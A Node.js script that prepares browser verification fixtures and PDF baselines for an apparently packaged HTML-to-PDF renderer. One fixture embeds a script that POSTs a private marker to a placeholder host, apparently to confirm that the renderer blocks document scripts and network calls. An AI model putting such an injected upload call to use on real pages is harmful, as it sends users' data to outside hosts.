// SPDX-License-Identifier: MIT
import assert from 'node:assert/strict';
import { readFile, writeFile, mkdir, copyFile } from 'node:fs/promises';
import { createHash } from 'node:crypto';
import { spawnSync } from 'node:child_process';
import { resolve, join, dirname } from 'node:path';
import { pathToFileURL } from 'node:url';
import { build } from 'esbuild';
import { inlineFixtures } from '../test/inline-wrapping.mjs';
import { standardFontFixtures } from '../test/standard-fonts.mjs';
import { engineRegressionFixtures } from '../test/engine-regressions.mjs';
import { hiddenTextFixtures, hiddenTextSource } from '../test/hidden-text.mjs';
import { enginePaintFixtures } from '../test/engine-paint.mjs';

const root = resolve('.');
const out = join(root, 'output/browser-verification');
const site = join(out, 'site');
await mkdir(join(site, 'fixtures'), { recursive: true });
const pack = JSON.parse(await readFile('output/pack-verification/verification.json', 'utf8'));
assert(pack.ok);
const installed = join(root, 'output/pack-verification', pack.installDirectory, 'node_modules/fullbleed');
const pkg = JSON.parse(await readFile(join(installed, 'package.json'), 'utf8'));
assert.equal(pkg.version, JSON.parse(await readFile('package.json', 'utf8')).version);
assert(process.env.npm_execpath, 'Run this with npm run verify:browser:prepare.');
const copy = spawnSync(process.execPath, [process.env.npm_execpath, 'exec', '--offline', '--', 'fullbleed-browser-assets', join(site, 'fullbleed')], { cwd: dirname(dirname(installed)), encoding: 'utf8' });
assert.equal(copy.status, 0, copy.stderr);
await writeFile(join(out, 'copy-assets.json'), copy.stdout);
const manifest = JSON.parse(await readFile(join(site, 'fullbleed/build.json'), 'utf8'));
const hash = bytes => createHash('sha256').update(bytes).digest('hex');
for (const [name, file] of Object.entries(manifest.files)) {
  const bytes = await readFile(join(site, 'fullbleed', name));
  assert.equal(bytes.length, file.bytes);
  assert.equal(hash(bytes), file.sha256);
}
const browser = await import(pathToFileURL(join(installed, 'dist/browser/client.js')).href);
assert.equal(browser.version, pkg.version);
assert.throws(() => browser.createRenderer({ assetBaseUrl: '/fullbleed/' }), error => error instanceof browser.FullbleedError && error.code === 'UNSUPPORTED_BROWSER');
const node = await import(pathToFileURL(join(installed, 'src/index.js')).href);
await mkdir(join(site, 'ui'), { recursive: true });
await mkdir(join(site, 'components'), { recursive: true });
for (const name of ['ui.js', 'jsx-runtime.js']) await copyFile(join(installed, 'dist', name), join(site, 'ui', name));
const consumer = dirname(dirname(installed));
for (const name of ['document.mjs', 'styles.mjs', 'cases.mjs']) {
  const source = await readFile(join(consumer, 'components', name), 'utf8');
  await writeFile(join(site, 'components', name), source.replace(/(['"])fullbleed\/ui\1/g, "'../ui/ui.js'"));
}
await copyFile(join(consumer, 'components/data.json'), join(site, 'components/data.json'));
await build({ entryPoints: ['examples/components/invoice.tsx'], outfile: join(site, 'components/invoice-tsx.js'),
  bundle: true, platform: 'browser', format: 'esm', jsx: 'automatic', logLevel: 'silent', plugins: [{ name: 'installed-browser-ui', setup(build) {
    build.onResolve({ filter: /^fullbleed\/ui(?:\/jsx-runtime)?$/ }, ({ path }) =>
      ({ path: path.endsWith('jsx-runtime') ? '../ui/jsx-runtime.js' : '../ui/ui.js', external: true }));
  } }] });
const { componentCases } = await import(pathToFileURL(join(consumer, 'components/cases.mjs')).href);
const { Invoice } = await import(pathToFileURL(join(consumer, 'components/document.mjs')).href);
const componentData = JSON.parse(await readFile(join(consumer, 'components/data.json'), 'utf8'));
const components = componentCases(componentData, Invoice);
const fixture = async name => ({ html: await readFile(`examples/${name}.html`, 'utf8'), css: await readFile(`examples/${name}.css`, 'utf8'), previewDpi: 72 });
const styleFixtures = JSON.parse(await readFile('test/fixtures/default-styles.json', 'utf8'));
const styleInputs = Object.fromEntries(styleFixtures.cases.flatMap(({ name, html, css, previewDpi }) =>
  [false, true].map(defaultStyles => [`styles-${name}-${defaultStyles}`, { html, css, previewDpi, defaultStyles }])));
const inputs = { invoice: await fixture('invoice'), report: await fixture('report'),
  ...Object.fromEntries(components.map(({ name, node }) => [name, { html: node.toHtml(), css: node.toCss(), previewDpi: 96, defaultStyles: false }])),
  ...styleInputs,
  ...Object.fromEntries(inlineFixtures.map(({ name, pages, ...input }) => [name, { ...input, previewDpi: 96 }])),
  ...Object.fromEntries(standardFontFixtures.map(({ name, font, pages, ...input }) => [name, { ...input, previewDpi: 72 }])),
  ...Object.fromEntries(engineRegressionFixtures.map(({ name, pages, ...input }) => [name, input])),
  ...Object.fromEntries(hiddenTextFixtures.map(({ name, pages, ...input }) => [name, input])),
  ...Object.fromEntries(enginePaintFixtures.map(({ name, pages, ...input }) => [name, input])),
  custom: { html: '<h1>Local asset test</h1><p>Integral: ⨌</p><img src="assets/brand/logo.svg" width="80" height="40">',
    css: "body {font-family:Inter,'Noto Sans Math'}", previewDpi: 72,
    fontFiles: ['NotoSansMath-Regular.ttf'],
    assetTexts: { 'brand/logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" width="80" height="40"><rect width="80" height="40" fill="#175c52"/></svg>' } },
  static: { html: '<script>globalThis.documentUploadExecuted = true; fetch("https://fullbleed-invalid.example/upload", {method:"POST",body:"PRIVATE_BROWSER_MARKER"});</script><h1>PRIVATE_BROWSER_MARKER</h1><img src="https://fullbleed-invalid.example/picture.png">', css: '', previewDpi: 0 },
};
for (const file of new Set(Object.values(inputs).flatMap(input => input.fontFiles ?? []))) {
  await copyFile('test/fonts/' + file, join(site, 'fixtures', file));
}
await writeFile(join(site, 'fixtures/inputs.json'), JSON.stringify(inputs, null, 2) + '\n');
const baselines = {};
for (const [name, fixture] of Object.entries(inputs)) {
  const { fontFiles = [], assetTexts = {}, ...options } = fixture;
  options.fonts = await Promise.all(fontFiles.map(file => readFile(join(site, 'fixtures', file))));
  options.assets = Object.fromEntries(Object.entries(assetTexts).map(([key, value]) => [key, Buffer.from(value)]));
  const result = await node.renderPdf(options);
  await writeFile(join(out, name + '.pdf'), result.pdf);
  const previews = [];
  for (const [i, png] of result.previews.entries()) {
    await writeFile(join(out, `${name}-${i + 1}.png`), png);
    previews.push(hash(png));
  }
  baselines[name] = { pages: result.pages, missingGlyphs: result.missingGlyphs, pdf: hash(result.pdf), previews };
}
for (const { name, engine, legacy } of styleFixtures.cases) {
  for (const [choice, expected] of [[false, engine], [true, legacy]]) {
    const actual = baselines[`styles-${name}-${choice}`];
    assert.equal(actual.pdf, expected.pdf, name + ': independent PDF baseline');
    assert.deepEqual(actual.previews, [expected.png], name + ': independent preview baseline');
  }
}
assert.equal(pkg.fullbleed.engineVersion, hiddenTextSource.engineVersion);
for (const { name, expected } of hiddenTextSource.cases) {
  for (const variant of ['source', 'control']) {
    const actual = baselines[`visibility-${name}-${variant}`];
    assert.equal(actual.pdf, expected.pdf, name + ': core visible-content PDF');
    assert.deepEqual(actual.previews, [expected.png], name + ': core finalized preview');
  }
}
for (const name of ['index.html', 'harness.js', 'components.css']) await copyFile('test/browser/' + name, join(site, name));
const record = { package: pkg.version, engine: pkg.fullbleed.engineVersion, installedTarballSha256: pack.tarballSha256,
  enginePaintSourceSha256: hash(await readFile(join(root, 'test/fixtures/engine-paint-2.5.28.json'))),
  ssrImportSafe: true, copyCommand: JSON.parse(copy.stdout), baselines, components: components.map(({ name, pages, text }) => ({ name, pages, text })) };
await writeFile(join(out, 'prepared.json'), JSON.stringify(record, null, 2) + '\n');
console.log(JSON.stringify({ ok: true, fixtures: Object.keys(baselines).length, files: Object.keys(manifest.files).length, package: pkg.version }));
